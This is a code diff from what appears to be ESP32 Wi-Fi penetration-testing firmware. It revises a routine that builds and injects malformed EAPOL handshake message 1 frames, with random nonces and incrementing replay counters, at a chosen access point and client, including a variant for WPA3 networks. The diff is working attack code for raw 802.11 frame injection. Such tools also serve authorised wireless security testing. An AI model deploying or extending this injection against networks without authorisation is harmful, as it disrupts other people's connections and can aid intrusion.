@@ -8976,27 +8976,53 @@ void WiFiScan::sendEapolBagMsg1(uint8_t bssid[6], int channel, uint8_t mac[6], u
   eapol_packet_bad_msg1[20] = bssid[4];
   eapol_packet_bad_msg1[21] = bssid[5]; 
 
+  const uint16_t sequence_control =
+    static_cast<uint16_t>((bad_msg_sequence_number & 0x0fffU) << 4);
+  eapol_packet_bad_msg1[22] = sequence_control & 0xffU;
+  eapol_packet_bad_msg1[23] = (sequence_control >> 8) & 0xffU;
+
   /* Generate random Nonce */
   for (uint8_t i = 0; i < 32; i++) {
     eapol_packet_bad_msg1[49 + i] = esp_random() & 0xFF;
   }
   /* Update replay counter */
   for (uint8_t i = 0; i < 8; i++) {
-    eapol_packet_bad_msg1[41 + i] = (packets_sent >> (56 - i * 8)) & 0xFF;
+    eapol_packet_bad_msg1[41 + i] =
+      (bad_msg_replay_counter >> (56 - i * 8)) & 0xffU;
   }
+
+  // Reset every security-dependent field because this packet template is
+  // reused across calls.
+  eapol_packet_bad_msg1[34] = 0x00;
+  eapol_packet_bad_msg1[35] = 0x75;
+  eapol_packet_bad_msg1[38] = 0xCA;
+  eapol_packet_bad_msg1[39] = 0x00;
+  eapol_packet_bad_msg1[40] = 0x10;
+  eapol_packet_bad_msg1[129] = 0x00;
+  eapol_packet_bad_msg1[130] = 0x16;
 
   if(sec == WIFI_SECURITY_WPA3 || sec == WIFI_SECURITY_WPA3_ENTERPRISE || sec == WIFI_SECURITY_WAPI) {
     eapol_packet_bad_msg1[35] = 0x5f;     // Length 95 Bytes
     eapol_packet_bad_msg1[38] = 0xCB;     // Key‑Info (LSB)  Install|Ack|Pairwise, ver=3
     eapol_packet_bad_msg1[39] = 0x00;     // Key Length MSB
     eapol_packet_bad_msg1[40] = 0x00;     // Key Length LSB   (must be 0 with GCMP)
+    eapol_packet_bad_msg1[129] = 0x00;    // No Key Data in the shortened frame
+    eapol_packet_bad_msg1[130] = 0x00;
     frame_size = frame_size - 22;         // Adjust frame size for WPA3
   }
 
   // Send packet
-  esp_wifi_80211_tx(WIFI_IF_AP, eapol_packet_bad_msg1, frame_size, false);
-
-  packets_sent = packets_sent + 1;
+  const esp_err_t tx_result = esp_wifi_80211_tx(
+    WIFI_IF_AP,
+    eapol_packet_bad_msg1,
+    frame_size,
+    false);
+  if (tx_result == ESP_OK) {
+    packets_sent++;
+    bad_msg_replay_counter++;
+    bad_msg_sequence_number =
+      static_cast<uint16_t>((bad_msg_sequence_number + 1U) & 0x0fffU);
+  }
 }
 
 /*void WiFiScan::sendEapolBagMsg1(uint8_t bssid[6], int channel, String dst_mac_str, uint8_t sec) {
